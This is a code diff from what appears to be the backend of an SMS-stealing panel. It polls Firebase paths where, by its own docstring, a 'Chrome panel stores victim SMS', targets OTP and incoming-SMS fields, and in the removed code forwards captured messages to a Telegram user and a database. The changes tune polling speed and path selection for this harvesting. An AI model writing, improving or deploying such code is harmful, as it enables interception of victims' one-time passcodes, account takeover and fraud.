@@ -17,12 +17,13 @@ from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
-POLL_INTERVAL_SEC = 2.0
-POLL_FETCH_TIMEOUT_SEC = 3.0
-SNAPSHOT_TIMEOUT_SEC = 8.0
-MONITORING_START_SNAPSHOT_SEC = 6.0
-MAX_POLL_PATHS_FALLBACK = 32
-POLL_PROFILE_CONCURRENCY = 2
+POLL_INTERVAL_SEC = 2.5
+POLL_FETCH_TIMEOUT_SEC = 2.5
+SNAPSHOT_TIMEOUT_SEC = 5.0
+MONITORING_START_SNAPSHOT_SEC = 4.0
+MAX_POLL_PATHS_FALLBACK = 8
+POLL_PROFILE_CONCURRENCY = 1
+HOT_POLL_MAX_PATHS = 4
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
     "sms",
@@ -592,6 +593,10 @@ def _extract_sms_records(path: str, value: Any) -> list[dict[str, Any]]:
         elif isinstance(child_val, list):
             records.extend(_extract_sms_records(child_path, child_val))
         elif isinstance(child_val, str):
+            if child_key in SENDER_FIELDS or child_key in BODY_FIELDS or child_key in TIME_FIELDS:
+                continue
+            if _first_field(value, SENDER_FIELDS) and _first_field(value, BODY_FIELDS):
+                continue
             text = child_val.strip()
             if text and not _is_poll_noise_record("Unknown", text):
                 sender, body = _parse_panel_sms_string(text)
@@ -751,33 +756,19 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
     return list(deduped.values())
 
 
-def _build_otp_sidecar_paths(device: Device) -> list[str]:
-    """Hot OTP paths — messages/{id} is where Chrome panel stores victim SMS."""
-    sidecar: list[str] = []
+def _build_hot_poll_paths(device: Device) -> list[str]:
+    """Minimal hot poll — messages/{id} tail is where Chrome panel stores victim SMS."""
+    paths: list[str] = []
     for device_id in _device_ids(device):
-        sidecar.extend(
+        paths.append(f"messages/{device_id}")
+    for device_id in _device_ids(device):
+        paths.extend(
             [
-                f"messages/{device_id}",
-                f"sms/{device_id}",
                 f"clients/{device_id}/lastSms",
-                f"clients/{device_id}/otp",
                 f"clients/{device_id}/webhookEvent/receiveSms",
-                f"clients/{device_id}/webhookEvent/incomingSms",
             ]
         )
-    if device.firebase_key:
-        fk = device.firebase_key.strip("/")
-        if not fk.startswith("clients/"):
-            sidecar.extend(
-                [
-                    f"clients/{fk}",
-                    f"clients/{fk}/sms",
-                    f"clients/{fk}/SMS",
-                    f"clients/{fk}/lastSms",
-                ]
-            )
-        sidecar.extend([f"{fk}/lastSms", f"{fk}/sms", f"{fk}/SMS", f"{fk}/otp"])
-    return list(dict.fromkeys(sidecar))[:12]
+    return list(dict.fromkeys(paths))[:HOT_POLL_MAX_PATHS]
 
 
 _poll_cycle: dict[int, int] = {}
@@ -791,53 +782,35 @@ async def fetch_firebase_sms_for_device(
     force_full: bool = False,
 ) -> list[dict[str, Any]]:
     root = firebase_root_url(firebase_url)
-    cycle = _poll_cycle.get(device.id, 0) + 1
-    _poll_cycle[device.id] = cycle
-    force_full = force_full or cycle % 6 == 0
-
-    sidecar_paths = _build_otp_sidecar_paths(device)
-    sidecar_records, _ = await _fetch_paths_parallel(root, sidecar_paths, timeout=timeout)
-
-    cached_paths = [] if force_full else get_cached_sms_paths(device)
-    if cached_paths and not force_full:
-        cached_records, hit_paths = await _fetch_paths_parallel(
-            root,
-            cached_paths,
-            timeout=timeout,
-        )
-        if hit_paths:
-            set_cached_sms_paths(device, hit_paths)
-        merged = _dedupe_records(sidecar_records + cached_records)
-        if merged:
-            return merged
-
-    all_paths = _generate_sms_paths(device)
-    priority: list[str] = []
-    if device.firebase_key:
-        fk = device.firebase_key.strip("/")
-        priority.extend(
-            [
-                fk,
-                f"{fk}/sms",
-                f"{fk}/lastSms",
-                f"{fk}/inbox",
-            ]
-        )
-    for device_id in _device_ids(device):
-        priority.extend(
-            [
-                f"messages/{device_id}",
-                f"sms/{device_id}",
-                f"clients/{device_id}/sms",
-                f"clients/{device_id}/lastSms",
-                f"clients/{device_id}/inbox",
-            ]
-        )
-    ordered = list(dict.fromkeys(priority + all_paths))[:MAX_POLL_PATHS_FALLBACK]
-    all_records, hit_paths = await _fetch_paths_parallel(root, ordered, timeout=timeout)
+    hot_paths = _build_hot_poll_paths(device)
+    hot_records, hit_paths = await _fetch_paths_parallel(root, hot_paths, timeout=timeout)
     if hit_paths:
         set_cached_sms_paths(device, hit_paths)
-    return _dedupe_records(sidecar_records + all_records)
+    if hot_records:
+        return _dedupe_records(hot_records)
+
+    cycle = _poll_cycle.get(device.id, 0) + 1
+    _poll_cycle[device.id] = cycle
+    if not force_full and cycle % 30 != 0:
+        return []
+
+    fallback: list[str] = []
+    for device_id in _device_ids(device):
+        fallback.extend(
+            [
+                f"clients/{device_id}/otp",
+                f"clients/{device_id}/webhookEvent/incomingSms",
+                f"sms/{device_id}",
+            ]
+        )
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        fallback.extend([f"{fk}/lastSms", f"{fk}/otp"])
+    fallback = list(dict.fromkeys(fallback))[:MAX_POLL_PATHS_FALLBACK]
+    fallback_records, hit_paths = await _fetch_paths_parallel(root, fallback, timeout=timeout)
+    if hit_paths:
+        set_cached_sms_paths(device, hit_paths)
+    return _dedupe_records(fallback_records)
 
 
 async def snapshot_firebase_sms_seen(
@@ -849,11 +822,16 @@ async def snapshot_firebase_sms_seen(
     firebase_url = _resolve_device_firebase_url(profile, device)
     if not firebase_url:
         return 0
+    root = firebase_root_url(firebase_url)
+    keys: set[str] = set()
     try:
-        records = await asyncio.wait_for(
-            fetch_firebase_sms_for_device(firebase_url, device, timeout=SNAPSHOT_TIMEOUT_SEC),
-            timeout=SNAPSHOT_TIMEOUT_SEC + 5,
-        )
+        for device_id in _device_ids(device):
+            keys.update(
+                await asyncio.wait_for(
+                    _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC),
+                    timeout=SNAPSHOT_TIMEOUT_SEC,
+                )
+            )
     except (asyncio.TimeoutError, httpx.HTTPError) as exc:
         logger.warning("Firebase SMS baseline fetch failed for %s: %s", device.name, exc)
         _set_baseline_sms_keys(device, set(), profile.started_at)
@@ -861,43 +839,7 @@ async def snapshot_firebase_sms_seen(
             db.commit()
         return 0
 
-    root = firebase_root_url(firebase_url)
-    previous_seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
-    keys: set[str] = set()
-    for device_id in _device_ids(device):
-        keys.update(await _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC))
-
     ignored = 0
-    for record in records:
-        fk = _record_dedup_key(record)
-        keys.add(fk)
-        if fk in previous_seen:
-            continue
-        if _is_old_for_monitoring(record, profile):
-            ignored += 1
-            continue
-        if _is_poll_noise_record(record["sender"], record["message"]):
-            ignored += 1
-            continue
-        if _is_outgoing_firebase_log(record["sender"], record["message"]):
-            ignored += 1
-            continue
-        asyncio.create_task(
-            _inject_and_stream_dm(
-                profile.telegram_user_id,
-                record["sender"],
-                record["message"],
-            )
-        )
-        if db is not None:
-            save_sms(
-                db,
-                sender=record["sender"],
-                message=record["message"],
-                device_name=device.name,
-                received_at=record.get("received_at"),
-            )
-            db.commit()
     _set_baseline_sms_keys(device, keys, profile.started_at)
     if db is not None:
         db.commit()
